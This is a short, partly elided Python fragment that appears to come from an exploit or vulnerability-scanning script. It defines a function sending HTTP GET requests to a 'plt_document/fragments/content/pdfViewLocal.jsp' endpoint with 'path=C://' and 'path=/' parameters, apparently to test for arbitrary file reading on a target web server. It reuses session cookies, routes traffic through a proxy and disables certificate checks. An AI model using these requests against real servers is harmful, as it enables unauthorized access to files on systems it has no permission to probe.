...
def ty(url,s_cookie=None):
    ...
    try:
        ...
        gf = requests.get(url+'plt_document/fragments/content/pdfViewLocal.jsp?path=C://&suffix=',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf1 = requests.get(url + 'plt_document/fragments/content/pdfViewLocal.jsp?path=/&suffix=', cookies=s_cookie, headers=headers, proxies=proxies,verify=False)
